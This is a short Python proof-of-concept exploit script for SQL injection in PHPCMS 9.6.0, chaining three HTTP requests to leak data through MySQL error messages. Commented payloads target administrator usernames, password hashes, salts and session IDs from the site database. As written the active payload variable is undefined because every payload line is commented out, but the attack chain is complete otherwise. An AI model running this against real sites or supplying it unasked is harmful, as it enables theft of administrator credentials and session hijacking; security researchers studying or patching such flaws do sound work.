#!/usr/bin/env python
# coding: utf-8
#Authon:phyb0x
#phpcms9.6.0 sqli

import requests
import urllib
import re

def poc(url):
	step1 = '{}/index.php?m=wap&a=index&siteid=1'.format(url)
	req = requests.get(url=step1)
	for i in req.cookies:
		if i.name[-7:] == '_siteid':
			userid_flash = i.value
		else:
			print('Step1 is error')

	#payload ='&id=%*27 and updatexml(1,concat(1,(select concat(username,0x3a,encrypt) from v9_admin)),1)%23&modelid=1&catid=1&m=1&f='
	#payload="&id=%*27 and updatexml(1,concat(1,(select concat(0x3a,password,0x3a) from v9_admin)),1)%23&modelid=1&catid=1&m=1&f="
	#payload="&id=%*27 and updatexml(1,concat(1,(select concat(0x706f6374657374,username,0x23,password,0x3a,encrypt,0x706f6374657374) from v9_admin)),1)%23&modelid=1&catid=1&m=1&f="
	#payload ='&id=%*27 and updatexml(1,concat(1,(select concat(sessionid) from v9_session)),1)%23&modelid=1&catid=1&m=1&f='
	
	payload =urllib.parse.quote(payload)
	step2 = "{}/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src={}".format(url,payload)
	data = {'userid_flash':userid_flash}
	req2 = requests.post(url=step2,data=data)
	for i in req2.cookies:
		if i.name[-9:] == '_att_json':
			a_k = i.value
	if a_k == '':
		print('sys_paylaod Bad')

	step3 = "{}/index.php?m=content&c=down&a_k={}".format(url,a_k)
	req3 = requests.get(url=step3)
	if 'MySQL Error' in req3.text:
		result = re.findall(r"MySQL Error : </b>XPATH syntax error: '(.*?)' <br /> <b>MySQL Errno",req3.text)
		print(result)

if __name__ == '__main__':
	poc('http://localhost/phpcms9.6.0/')
